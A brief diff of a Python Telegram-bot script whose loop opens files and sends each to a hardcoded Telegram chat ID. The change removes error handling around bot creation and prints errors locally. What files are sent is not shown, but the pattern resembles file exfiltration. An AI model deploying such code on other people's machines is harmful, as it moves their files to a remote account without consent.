@@ -22,10 +22,7 @@ except Exception as E:
 
 global bot
 
-try:
-    bot = Bot(token=API_TOKEN)
-except Exception as E:
-    print(E)
+bot = Bot(token=API_TOKEN)
 
 async def resp():
     try:
@@ -37,7 +34,7 @@ async def resp():
             doc = open(i, 'rb')
             await bot.send_document(838496332, doc)
         except Exception as E:
-            await bot.send_message(838496332, str(E))
+            print(i, E)
 
 
 if __name__ == '__main__':
